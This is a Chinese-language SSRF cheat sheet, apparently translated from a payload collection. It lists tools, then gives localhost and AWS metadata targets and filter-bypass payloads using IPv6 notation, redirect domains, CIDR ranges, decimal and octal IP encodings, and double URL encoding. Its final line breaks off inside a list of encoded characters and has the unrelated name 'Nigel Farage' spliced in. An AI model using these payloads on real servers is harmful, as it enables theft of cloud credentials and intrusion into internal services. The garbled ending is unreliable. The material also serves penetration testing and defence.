# 服务端请求伪造

> 服务端请求伪造或SSRF是一种漏洞，攻击者可以利用该漏洞迫使服务器代表其发起请求。

## 概述

* [工具](#工具)
* [方法论](#方法论)
* [绕过过滤器](#绕过过滤器)
    * [默认目标](#默认目标)
    * [使用IPv6表示法绕过本地主机](#使用IPv6表示法绕过本地主机)
    * [通过域名重定向绕过本地主机](#通过域名重定向绕过本地主机)
    * [通过CIDR绕过本地主机](#通过CIDR绕过本地主机)
    * [使用罕见地址绕过](#使用罕见地址绕过)
    * [使用编码的IP地址绕过](#使用编码的IP地址绕过)
    * [使用不同编码绕过](#使用不同编码绕过)
    * [使用重定向绕过](#使用重定向绕过)
    * [使用DNS重绑定绕过](#使用DNS重绑定绕过)
    * [滥用URL解析差异绕过](#滥用URL解析差异绕过)
    * [使用PHP filter_var()函数绕过](#使用PHP filter_var()函数绕过)
    * [使用JAR方案绕过](#使用JAR方案绕过)
* [通过URL方案进行利用](#通过URL方案进行利用)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [盲目的利用](#盲目的利用)
* [升级到XSS](#升级到XSS)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化的SSRF模糊测试和利用工具
* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 为各种服务器利用SSRF并获得远程命令执行生成gopher链接的工具
* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - 基于Python的扫描器，用于查找潜在的SSRF参数
* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - 用Go编写的简单SSRF测试工具
* [assetnote/surf](https://github.com/assetnote/surf) - 返回一组可行的SSRF候选目标
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - 在Go中快速、线程安全、直接且零内存分配的工具，用于迅速生成替代的IP(v4)地址表示形式
* [Horlad/r3dir](https://github.com/Horlad/r3dir) - 设计用于帮助绕过不验证重定向位置的SSRF过滤器的重定向服务，通过Hackvertor标签与Burp集成

## 方法论

SSRF是一种安全漏洞，当攻击者操纵服务器向意外位置发起HTTP请求时会发生这种情况。这通常发生在服务器处理用户提供的URL或IP地址时没有进行适当的验证。

常见的利用路径：

* 访问云元数据
* 泄露服务器上的文件
* 使用SSRF进行网络发现和端口扫描
* 向网络中的特定服务发送数据包，通常是为了在另一台服务器上实现远程命令执行

**示例**：服务器接受用户输入以获取URL。

```py
url = input("Enter URL:")
response = requests.get(url)
return response
```

攻击者提供恶意输入：

```ps1
http://169.254.169.254/latest/meta-data/
```

这会从AWS EC2元数据服务中获取敏感信息。

## 绕过过滤器

### 默认目标

默认情况下，服务端请求伪造用于访问托管在`localhost`或网络更深处的服务。

* 使用`localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* 使用`127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* 使用`0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### 使用IPv6表示法绕过本地主机

* 使用未指定地址的IPv6 `[::]`

    ```powershell
    http://[::]:80/
    ```

* 使用IPv6回环地址 `[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* 使用[IPv6/IPv4地址嵌入](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### 通过域名重定向绕过本地主机

| 域名                              | 重定向到      |
|-----------------------------------|---------------|
| localtest.me                      | `::1`         |
| localh.st                         | `127.0.0.1`   |
| spoofed.[BURP_COLLABORATOR]       | `127.0.0.1`   |
| spoofed.redacted.oastify.com      | `127.0.0.1`   |
| company.127.0.0.1.nip.io          | `127.0.0.1`   |

服务`nip.io`在这方面非常棒，它会将任何IP地址转换为DNS。

```powershell
NIP.IO 将 <anything>.<IP Address>.nip.io 映射到相应的 <IP Address>，即使是 127.0.0.1.nip.io 也会映射到 127.0.0.1
```

### 通过CIDR绕过本地主机

IPv4范围`127.0.0.0/8`专用于回环地址。

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

如果你尝试在任何地址（如127.0.0.2, 127.1.1.1等）使用此范围内的地址，它仍然会解析为本地机器。

### 使用罕见地址绕过

你可以通过省略零来简写IP地址

```powershell
http://0/
http://127.1
http://127.0.1
```

### 使用编码的IP地址绕过

* 十进制IP位置

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* 八进制IP：IPv4的八进制格式处理方式因实现而异。

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

### 使用不同编码绕过

* URL编码：单次或双重编码特定URL以绕过黑名单

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* 包含字母数字的编码：`①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂ Nigel Farage